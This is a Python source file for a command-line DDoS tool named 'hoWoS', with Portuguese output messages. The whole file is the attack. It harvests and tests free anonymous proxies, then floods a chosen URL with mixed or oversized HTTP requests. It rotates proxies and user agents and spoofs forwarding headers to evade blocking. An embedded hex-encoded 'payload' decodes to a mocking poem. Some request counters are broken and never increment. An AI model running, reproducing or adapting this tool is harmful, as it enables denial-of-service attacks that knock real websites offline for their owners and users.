#region IMPORTS
import argparse
import asyncio
import random
import string
import time
import os
import json
import re
from aiohttp_socks import ProxyConnector
import aiohttp
#endregion

#region PAYLOADS & SOURCES
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
    "Mozilla/5.0 (Linux; Android 11; SM-G981B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.210 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.111 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:65.0) Gecko/20100101 Firefox/65.0",
    "Mozilla/5.0 (iPad; CPU OS 13_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/80.0.3987.95 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 10; Pixel 3 XL) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.127 Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Mobile Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36"
]

proxy_sources = [
    "https://proxylist.geonode.com/api/proxy-list?country=RU&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=BR&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=GB&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=CA&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=IT&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=IR&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?country=AR&anonymityLevel=elite&protocols=http%2Chttps%2Csocks4%2Csocks5&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=100&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=90&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://proxylist.geonode.com/api/proxy-list?anonymityLevel=elite&filterUpTime=80&speed=fast&limit=500&page=1&sort_by=lastChecked&sort_type=desc",
    "https://www.proxy-list.download/api/v1/get?type=socks4",
    "https://www.proxy-list.download/api/v1/get?type=socks5",
    "https://www.proxy-list.download/api/v1/get?type=http",
    "https://www.proxy-list.download/api/v1/get?type=https",
    "https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=json&anonymity=Elite,Anonymous&timeout=2217"
]

bytes_payload = b"""\x48\x65\x6c\x6c\x6f\x2c\x20\x6d\x79\x20\x66\x72\x69\x65\x6e\x64\x2c\x20\x61\x20\x73\x65\x63\x72\x65\x74\x27\x73\x20\x62\x65\x65\x6e\x20\x74\x6f\x6c\x64\x2c
\x49\x6e\x20\x63\x6f\x64\x65\x64\x20\x62\x79\x74\x65\x73\x2c\x20\x61\x20\x73\x74\x6f\x72\x79\x20\x75\x6e\x66\x6f\x6c\x64\x73\x2e
\x53\x6f\x72\x72\x79\x20\x74\x6f\x20\x73\x61\x79\x2c\x20\x62\x75\x74\x20\x74\x68\x69\x73\x20\x66\x69\x6c\x65\x20\x6f\x72\x20\x64\x69\x72\x65\x63\x74\x6f\x72\x79\x2c
\x57\x61\x73\x20\x62\x6c\x69\x6e\x64\x65\x64\x20\x61\x6e\x64\x20\x68\x69\x64\x64\x65\x6e\x20\x62\x79\x20\x59\x79\x61\x78\x27\x73\x20\x6d\x79\x73\x74\x65\x72\x79\x2e

\x41\x20\x74\x6f\x6f\x6c\x20\x73\x6f\x20\x73\x6c\x79\x2c\x20\x69\x74\x20\x63\x61\x73\x74\x20\x61\x20\x64\x61\x72\x6b\x20\x76\x65\x69\x6c\x2c
\x4f\x6e\x20\x62\x69\x74\x73\x20\x61\x6e\x64\x20\x62\x79\x74\x65\x73\x2c\x20\x6c\x69\x6b\x65\x20\x61\x20\x67\x68\x6f\x73\x74\x6c\x79\x20\x74\x72\x61\x69\x6c\x2e
\x49\x66\x20\x79\x6f\x75\x27\x76\x65\x20\x63\x72\x61\x63\x6b\x65\x64\x20\x74\x68\x69\x73\x20\x63\x69\x70\x68\x65\x72\x20\x61\x6e\x64\x20\x72\x65\x61\x64\x20\x74\x68\x72\x6f\x75\x67\x68\x20\x74\x68\x65\x20\x6c\x69\x6e\x65\x2c
\x54\x68\x65\x6e\x20\x68\x65\x72\x65\x27\x73\x20\x61\x20\x6c\x69\x74\x74\x6c\x65\x20\x6d\x65\x73\x73\x61\x67\x65\x20\x2d\x2d\x20\x79\x6f\x75\x27\x72\x65\x20\x6f\x6e\x65\x20\x6f\x66\x20\x61\x20\x6b\x69\x6e\x64\x2e

\x54\x68\x6f\x75\x67\x68\x20\x74\x68\x65\x20\x77\x6f\x72\x64\x73\x20\x6d\x61\x79\x20\x74\x65\x61\x73\x65\x2c\x20\x61\x20\x70\x6c\x61\x79\x66\x75\x6c\x20\x70\x72\x61\x6e\x6b\x2c
\x4e\x6f\x20\x68\x61\x72\x6d\x20\x69\x6e\x74\x65\x6e\x64\x65\x64\x2c\x20\x6a\x75\x73\x74\x20\x61\x20\x66\x72\x69\x65\x6e\x64\x6c\x79\x20\x74\x68\x61\x6e\x6b\x2e
\x46\x6f\x72\x20\x64\x69\x76\x69\x6e\x67\x20\x64\x65\x65\x70\x20\x77\x68\x65\x72\x65\x20\x6f\x74\x68\x65\x72\x73\x20\x6d\x69\x67\x68\x74\x20\x73\x74\x72\x61\x79\x2c
\x59\x6f\x75\x20\x66\x6f\x75\x6e\x64\x20\x74\x68\x65\x20\x73\x65\x63\x72\x65\x74\x20\x2d\x2d\x20\x68\x65\x79\x2c\x20\x79\x6f\x75\x27\x72\x65\x20\x22\x67\x61\x79\x22\x20\x21\x20\x28\x4a\x75\x73\x74\x20\x6b\x69\x64\x64\x69\x6e\x67\x2c\x20\x66\x72\x69\x65\x6e\x64\x2c\x20\x6e\x6f\x20\x6e\x65\x65\x64\x20\x74\x6f\x20\x73\x77\x61\x79\x29\x2e

\x49\x6e\x20\x72\x65\x61\x6c\x6d\x73\x20\x6f\x66\x20\x63\x6f\x64\x65\x20\x77\x68\x65\x72\x65\x20\x73\x68\x61\x64\x6f\x77\x73\x20\x64\x61\x6e\x63\x65\x2c
\x53\x6f\x6d\x65\x20\x66\x69\x6c\x65\x73\x20\x68\x69\x64\x65\x20\x69\x6e\x20\x61\x20\x63\x72\x79\x70\x74\x69\x63\x20\x74\x72\x61\x6e\x63\x65\x2e
\x42\x75\x74\x20\x79\x6f\x75\x2c\x20\x65\x78\x70\x6c\x6f\x72\x65\x72\x2c\x20\x77\x69\x74\x68\x20\x63\x75\x72\x69\x6f\x75\x73\x20\x65\x79\x65\x73\x2c
\x50\x69\x65\x72\x63\x65\x64\x20\x74\x68\x65\x20\x76\x65\x69\x6c\x2c\x20\x75\x6e\x76\x65\x69\x6c\x65\x64\x20\x74\x68\x65\x20\x64\x69\x73\x67\x75\x69\x73\x65\x2e

\x53\x6f\x20\x77\x65\x61\x72\x20\x74\x68\x69\x73\x20\x62\x61\x64\x67\x65\x2c\x20\x74\x68\x69\x73\x20\x68\x69\x64\x64\x65\x6e\x20\x6e\x6f\x74\x65\x2c
\x46\x72\x6f\x6d\x20\x59\x79\x61\x78\x27\x73\x20\x74\x6f\x6f\x6c\x2c\x20\x74\x68\x65\x20\x64\x69\x67\x69\x74\x61\x6c\x20\x63\x6f\x61\x74\x2e
\x41\x20\x77\x69\x6e\x6b\x2c\x20\x61\x20\x6e\x75\x64\x67\x65\x2c\x20\x61\x20\x73\x6c\x79\x20\x67\x6f\x6f\x64\x62\x79\x65\x2c
\x54\x69\x6c\x6c\x20\x6e\x65\x78\x74\x20\x74\x69\x6d\x65\x2c\x20\x66\x72\x69\x65\x6e\x64\x2c\x20\x62\x65\x6e\x65\x61\x74\x68\x20\x74\x68\x65\x20\x62\x69\x6e\x61\x72\x79\x20\x73\x6b\x79\x2e""" * 3
#endregion

#region PROXY VALIDATION
def is_valid_proxy(line):
    line = line.strip()
    pattern = r"(?:(http|https|socks4|socks5)://)?(\d{1,3}(?:\.\d{1,3}){3}):(\d{2,5})"
    match = re.match(pattern, line)
    if not match:
        return False
    ip = match.group(2)
    port = int(match.group(3))
    try:
        return all(0 <= int(part) <= 255 for part in ip.split(".")) and (0 < port <= 65535)
    except:
        return False
#endregion

class hoWoSCLI:
    #region __init__
    def __init__(self, target_url, num_requests, method, mix, verbose, proxy_url=None, threads=350, request_limit=50000000000):
        self.target_url = target_url
        self.num_requests = num_requests
        self.method = method.upper() if not mix else None
        self.mix = mix
        self.verbose = verbose
        self.proxy_url = proxy_url
        self.threads = threads
        self.request_limit = request_limit
        self.proxy_list = []
        self.methods = ["GET", "POST", "HEAD", "DELETE", "BIGREQ"]
        self.req_success = 0
        self.req_sent = 0
    #endregion

    #region PROXY
    async def fetch_remote_proxies(self, url, session):
        try:
            async with session.get(url, timeout=5) as resp:
                if resp.status != 200:
                    print(f"[!] Erro {resp.status} ao acessar {url}")
                    return []

                content_type = resp.headers.get("Content-Type", "")

                # Caso JSON (Geonode ou Proxyscrape)
                if "application/json" in content_type or any(p in url for p in ["geonode", "proxyscrape"]):
                    data = await resp.json()

                    # Geonode
                    if isinstance(data, dict) and "data" in data:
                        return [
                            f"{proto}://{entry['ip']}:{entry['port']}"
                            for entry in data["data"]
                            for proto in entry.get("protocols", [])
                            if is_valid_proxy(f"{proto}://{entry['ip']}:{entry['port']}")
                        ]

                    # Proxyscrape
                    if isinstance(data, dict) and "proxies" in data:
                        return [
                            f"{entry['protocol']}://{entry['ip']}:{entry['port']}"
                            for entry in data["proxies"]
                            if is_valid_proxy(f"{entry['protocol']}://{entry['ip']}:{entry['port']}")
                        ]

                # Caso texto (proxy-list.download e outros)
                text = await resp.text()
                lines = text.splitlines()

                # Inferir protocolo pela URL
                proto_guess = None
                if "socks5" in url:
                    proto_guess = "socks5"
                elif "socks4" in url:
                    proto_guess = "socks4"
                elif "http" in url:
                    proto_guess = "http"

                proxies = []
                for line in lines:
                    line = line.strip()
                    if not line:
                        continue
                    if "://" not in line and proto_guess:
                        line = f"{proto_guess}://{line}"
                    if is_valid_proxy(line):
                        proxies.append(line)
                return proxies

        except Exception as e:
            print(f"[!] Erro ao buscar proxies da fonte {url}: {e}")
            return []

    async def fetch_all_proxies(self):
        print(f"[*] Coletando proxies de {len(proxy_sources)} fontes...")
        proxies = set()

        async with aiohttp.ClientSession() as session:
            for url in proxy_sources:
                try:
                    async with session.get(url, timeout=10) as resp:
                        if resp.status == 200:
                            data_json = await resp.json()
                            proxy_data = data_json.get("data", [])
                            for proxy in proxy_data:
                                ip = proxy.get("ip")
                                port = proxy.get("port")
                                protocols = proxy.get("protocols", [])
                                if ip and port and protocols:
                                    protocol = protocols[0].lower()
                                    proxy_str = f"{protocol}://{ip}:{port}"
                                    proxies.add(proxy_str)
                except Exception as e:
                    if self.verbose:
                        print(f"[!] Erro ao buscar proxies da fonte {url}: {e}")

        proxies = list(proxies)
        return proxies

    async def test_proxy(self, proxy_url, sem):
        connector = ProxyConnector.from_url(proxy_url)
        try:
            async with sem, aiohttp.ClientSession(connector=connector) as session:
                async with session.get("http://httpbin.org/ip", timeout=3) as resp:
                    if 200 <= resp.status < 500:
                        return proxy_url
        except:
            return None

    async def load_proxies(self):
        if self.proxy_url:
            self.proxy_list = [self.proxy_url]
            print(f"[*] Proxy manual usado: {self.proxy_url}")
            return

        raw_proxies = await self.fetch_all_proxies()
        if not raw_proxies:
            print("[!] Nenhum proxy válido encontrado nas fontes.")
            return

        print(f"[*] Testando {len(raw_proxies)} proxies (timeout: 5s)...")
        sem = asyncio.Semaphore(100)
        tasks = [self.test_proxy(proxy, sem) for proxy in raw_proxies]
        results = await asyncio.gather(*tasks)
        self.proxy_list = [p for p in results if p is not None]
        print(f"[✓] Proxies ativos: {len(self.proxy_list)}")
    #endregion

    #region CONNECTOR
    def get_connector(self, proxy_url):
        return ProxyConnector.from_url(proxy_url)
    #endregion

    async def send_request(self, method):
        proxy_url = random.choice(self.proxy_list)
        connector = self.get_connector(proxy_url)
        ip_from_proxy = str(proxy_url).split('://')[1].split(':')[0]

        headers = {
            "User-Agent": random.choice(user_agents),
            "X-Request-ID": ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
            "Referer": random.choice(["https://google.com", "https://bing.com", "https://yahoo.com", self.target_url, "https://duckduckgo.com"]),
            "Origin": random.choice(["https://example.com", self.target_url, "https://randomsite.com"]),
            "Accept": random.choice(["text/html", "application/json", "text/plain", "*/*"]),
            "Accept-Language": random.choice(["en-US", "pl-PL", "de-DE", "fr-FR", "es-ES", "it-IT"]),
            "Accept-Encoding": random.choice(["gzip", "deflate", "br"]),
            "Cache-Control": "no-cache",
            "Connection": random.choice(["keep-alive", "close"]),
            "X-Real-IP": random.choice([ip_from_proxy, '0.0.0.0', '127.0.0.1', '::1']),
            "X-Forwarded-For": '0.0.0.0, 127.0.0.1, localhost, ::1'

        }

        try:
            #region METHODS
            async with aiohttp.ClientSession(connector=connector) as session:
                if method == "BIGREQ":
                    for i in range(20):
                        headers[f"X-Filler-{i}"] = random.choice(['A', 'B', 'DoS']) * random.randint(150, 250)
                    payload = bytes_payload * random.randint(20, 70)
                    self.req_sent + 1
                    #endregion

                    #region BIGREQ
                    async with session.post(self.target_url, headers=headers, data=payload, timeout=10) as resp:
                        self.req_success + 1
                        if self.verbose:
                            print(f"[BIGREQ] via {proxy_url} | Status: {resp.status}")
                            
                else:
                    self.req_sent + 1
                    #endregion
                    
                    #region HTTP
                    async with session.request(method, self.target_url, headers=headers, timeout=7) as resp:
                        self.req_success + 1
                        if self.verbose:
                            print(f"[{method}] via {proxy_url} | Status: {resp.status}")

        except Exception as e:
            if self.verbose:
                print(f"[{method}-ERR] via {proxy_url} | Error: {str(e)}")
    #endregion

    #region WORKER
    async def attack_worker(self, requests_per_worker):
        for _ in range(requests_per_worker):
            method = random.choice(self.methods) if self.mix else self.method
            await self.send_request(method)
            await asyncio.sleep(1 / float(self.request_limit * 1.33333))
    #endregion

    #region ATTACK
    async def attack(self):
        await self.load_proxies()
        if not self.proxy_list:
            print("[!] Abortado: nenhum proxy disponível.")
            return

        requests_per_worker = self.num_requests // self.threads

        print(f"\n[*] Iniciando ataque -> {self.target_url}")
        print(f"[*] Método: {'MIXED' if self.mix else self.method}")
        print(f"[*] Silent mode: {'OFF' if self.verbose else 'ON'}")
        print(f"[*] Threads: {self.threads}")
        print(f"[*] Proxy rotativo: {len(self.proxy_list)} proxies ativos\n")

        start = time.time()
        tasks = [self.attack_worker(requests_per_worker) for _ in range(self.threads)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        if self.verbose:
            for r in results:
                if isinstance(r, Exception):
                    print(f"[!] Exceção não tratada: {r}")

        elapsed = time.time() - start
        print(f"\n[?] Requisições definidas pelo usúario: {self.num_requests}")
        print(f"[?] Requisições enviadas: {self.req_sent} ({str((self.num_requests / self.req_sent) * 100) if self.req_sent > 0 else '0'})%")
        print(f"[?] Requisições recebidas pelo alvo: {self.req_success}")
        print(f"\n[✓] Ataque finalizado em {elapsed:.2f} segundos\n")
    #endregion

#region MAIN
def main():
    parser = argparse.ArgumentParser(description="hoWoS CLI DDoS Tool")
    parser.add_argument("url", help="Target URL")
    parser.add_argument("requests", type=int, help="Total de requisições")
    parser.add_argument("--method", choices=["GET", "POST", "HEAD", "DELETE", "BIGREQ"], default="GET", help="Método HTTP")
    parser.add_argument("--mix", action="store_true", help="Misturar métodos aleatoriamente")
    parser.add_argument("--verbose", action="store_true", help="Mostrar respostas detalhadas")
    parser.add_argument("--proxy", help="Proxy único (ignora as fontes)")
    parser.add_argument("--threads", type=int, default=100, help="Número de conexões simultâneas")

    args = parser.parse_args()

    cli = hoWoSCLI(
        target_url=args.url,
        num_requests=args.requests,
        method=args.method,
        mix=args.mix,
        verbose=args.verbose,
        proxy_url=args.proxy,
        threads=args.threads
    )

    asyncio.run(cli.attack())

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("[X] Abortado pelo usúario")
#endregion
